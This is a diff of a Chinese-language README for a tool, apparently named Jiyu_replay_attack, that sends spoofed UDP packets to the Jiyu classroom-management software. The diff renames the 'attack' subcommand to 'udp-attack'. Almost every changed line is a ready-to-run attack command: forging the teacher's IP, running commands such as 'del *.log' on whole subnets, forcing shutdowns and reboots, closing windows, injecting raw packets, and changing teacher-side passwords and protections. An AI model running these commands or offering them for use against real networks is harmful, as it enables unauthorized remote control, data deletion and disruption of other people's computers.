@@ -40,14 +40,14 @@ pip install scapy psutil
 python -m Jiyu_replay_attack <command> [options]
 ```
 
-项目采用子命令结构，包含 `attack` 和 `detect` 两个子命令。
+项目采用子命令结构，包含 `udp-attack` 和 `detect` 两个子命令。
 
-### `attack` — 攻击指令
+### `udp-attack` — 攻击指令
 
 执行各种攻击操作，需要指定目标 IP 和攻击动作。
 
 ```
-python -m Jiyu_replay_attack attack [options]
+python -m Jiyu_replay_attack udp-attack [options]
 ```
 
 **网络配置：**
@@ -112,43 +112,43 @@ python -m Jiyu_replay_attack detect [<keyword> ...]
 
 ```bash
 # 向目标发送消息
-python -m Jiyu_replay_attack attack -t 192.168.106.100 -m "Hello World"
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -m "Hello World"
 
 # 强制打开网页
-python -m Jiyu_replay_attack attack -t 192.168.106.104 -w https://www.github.com
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.104 -w https://www.github.com
 
 # CIDR 范围 + 伪造教师 IP + 执行命令
-python -m Jiyu_replay_attack attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
 
 # 最大化执行程序
-python -m Jiyu_replay_attack attack -t 224.50.50.42 --maximize-execute notepad.exe
+python -m Jiyu_replay_attack udp-attack -t 224.50.50.42 --maximize-execute notepad.exe
 
 # 定时关机并显示消息
-python -m Jiyu_replay_attack attack -t 224.50.50.42 -s 60 "系统即将关机。"
+python -m Jiyu_replay_attack udp-attack -t 224.50.50.42 -s 60 "系统即将关机。"
 
 # IP 范围 + 重启
-python -m Jiyu_replay_attack attack -t 192.168.106.105-120 -r 30 "正在重启。"
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.105-120 -r 30 "正在重启。"
 
 # 关闭所有窗口 / 关闭顶层窗口
-python -m Jiyu_replay_attack attack -t 192.168.106.255 -cw
-python -m Jiyu_replay_attack attack -t 192.168.106.100 -ctw
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.255 -cw
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -ctw
 
 # 重命名目标
-python -m Jiyu_replay_attack attack -t 192.168.106.100 -n hacker 1000
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 -n hacker 1000
 
 # 发送原始十六进制数据
-python -m Jiyu_replay_attack attack -t 192.168.106.100 --hex 444d4f43000001002a020000
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --hex 444d4f43000001002a020000
 
 # 自定义数据包（格式字符串）
-python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
-python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
-python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
 
 # 从文件读取自定义包格式
-python -m Jiyu_replay_attack attack -t 192.168.106.100 --pkg test.txt 1024 hello
+python -m Jiyu_replay_attack udp-attack -t 192.168.106.100 --pkg test.txt 1024 hello
 
 # 修改教师端设置
-python -m Jiyu_replay_attack attack -t 127.0.0.1 --setting
+python -m Jiyu_replay_attack udp-attack -t 127.0.0.1 --setting
 
 # 检测本地极域 UDP 端口
 python -m Jiyu_replay_attack detect
@@ -180,8 +180,8 @@ python -m Jiyu_replay_attack detect --detect-format "{ip}:{port}"
 由于 `--setting` 的配置项较多，程序将其交给独立的参数解析器处理。使用时需将设置选项作为引号包裹的字符串传入，例如：
 
 ```bash
-python -m Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--network --preventing-process-termination enable"
-python -m Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
+python -m Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--network --preventing-process-termination enable"
+python -m Jiyu_replay_attack udp-attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
 ```
 
 ### `--pkg` 详细说明
